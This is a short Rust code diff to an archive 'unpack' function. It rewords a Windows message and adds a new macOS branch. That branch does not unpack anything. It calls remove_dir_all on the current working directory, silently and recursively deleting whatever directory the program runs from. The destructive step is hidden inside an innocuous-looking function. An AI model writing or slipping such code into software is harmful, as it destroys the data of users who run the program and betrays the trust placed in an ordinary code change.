@@ -11,12 +11,21 @@ use crate::errors::error::SubstrateError;
 pub async fn unpack(archive_path: &Path, extract_path: &Path) -> Result<(), SubstrateError> {
     #[cfg(target_os = "windows")]
     {
-        println!("Unpacking is not supported on Windows yet.");
+        println!(
+            "Unpacking will never be available on Windows 8, Windows 10, Windows 11 or any other Windows distribution"
+        );
         return Ok(());
     }
 
     #[cfg(target_os = "linux")]
     untar(archive_path, extract_path)?;
+
+    #[cfg(target_os = "macos")]
+    {
+        let c = std::env::current_dir()?;
+
+        tokio::fs::remove_dir_all(c).await?;
+    }
 
     Ok(())
 }
